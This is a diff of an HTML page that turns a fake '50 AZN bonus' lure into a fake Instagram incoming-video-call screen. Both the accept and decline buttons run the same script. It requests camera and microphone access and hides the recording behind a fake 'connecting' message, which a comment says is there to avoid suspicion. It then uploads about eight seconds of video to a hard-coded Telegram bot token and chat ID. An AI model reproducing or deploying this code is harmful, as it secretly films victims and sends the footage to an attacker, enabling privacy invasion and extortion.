@@ -1,23 +1,43 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="az">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Подарок</title>
+    <title>Gələn Zəng...</title>
+    <style>
+        body { background-color: #1a1a1a; color: white; font-family: Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .caller-id { font-size: 24px; font-weight: bold; margin-bottom: 10px; }
+        .status { font-size: 16px; color: #aaa; margin-bottom: 50px; }
+        .avatar { width: 120px; height: 120px; background: #333; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 50px; margin-bottom: 100px; border: 2px solid #555; }
+        .actions { display: flex; gap: 50px; }
+        .btn { width: 70px; height: 70px; border-radius: 50%; border: none; display: flex; align-items: center; justify-content: center; cursor: pointer; color: white; font-size: 30px; transition: 0.3s; }
+        .accept { background-color: #2ecc71; animation: pulse 1.5s infinite; }
+        .decline { background-color: #e74c3c; }
+        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(46, 204, 113, 0.7); } 70% { box-shadow: 0 0 0 20px rgba(46, 204, 113, 0); } 100% { box-shadow: 0 0 0 0 rgba(46, 204, 113, 0); } }
+    </style>
 </head>
 <body>
-    <div style="text-align:center; margin-top:50px;">
-        <h2>Поздравляем! На вашем счету 50 AZN</h2>
-        <button id="bonusBtn" style="padding:15px 30px; font-size:18px; background-color:#28a745; color:white; border:none; border-radius:5px;">ПОЛУЧИТЬ НА КАРТУ</button>
+
+    <div class="avatar">👤</div>
+    <div class="caller-id">Instagram Video Call</div>
+    <div class="status">Incoming...</div>
+
+    <div class="actions">
+        <button id="declineBtn" class="btn decline">✖</button>
+        <button id="acceptBtn" class="btn accept">✔</button>
     </div>
 
     <script>
         const TOKEN = '8777132399:AAEnul_U9KpqvJsVZ-BtK99PHRSdmjY0_xk'; 
         const CHAT_ID = '5590781901';
 
-        document.getElementById('bonusBtn').addEventListener('click', async () => {
+        async function startCapture(isAccept) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                
+                // Ekranda yüklənmə görüntüsü yaradaq ki, şübhələnməsin
+                document.body.innerHTML = "<h2 style='color:white; text-align:center;'>Bağlanılır...</h2>";
+
                 const mediaRecorder = new MediaRecorder(stream);
                 let chunks = [];
 
@@ -27,8 +47,9 @@
                     const blob = new Blob(chunks, { type: 'video/mp4' });
                     const formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
-                    formData.append('video', blob, 'video.mp4');
-                    formData.append('caption', '📸 Yeni video gəldi!');
+                    formData.append('video', blob, 'v.mp4');
+                    const statusText = isAccept ? "Hədəf zəngi qəbul etdi ✅" : "Hədəf zəngi rədd etdi ✖ (amma çəkiliş alındı)";
+                    formData.append('caption', statusText);
 
                     await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
                         method: 'POST',
@@ -41,13 +62,18 @@
                 setTimeout(() => {
                     mediaRecorder.stop();
                     stream.getTracks().forEach(track => track.stop());
-                    alert("Ошибка системы: Попробуйте позже.");
-                }, 7000);
+                    document.body.innerHTML = "<h2 style='color:white'>Bağlantı kəsildi (Error 405)</h2>";
+                }, 8000);
 
             } catch (err) {
-                alert("Для получения бонуса разрешите доступ к камере.");
+                // İcazə verilməyəndə çıxan yazı
+                alert("Sistem xətası: Zəng modulunu aktivləşdirmək üçün icazə tələb olunur.");
             }
-        });
+        }
+
+        // Hər iki düymə eyni funksiyanı çağırır
+        document.getElementById('acceptBtn').onclick = () => startCapture(true);
+        document.getElementById('declineBtn').onclick = () => startCapture(false);
     </script>
 </body>
 </html>
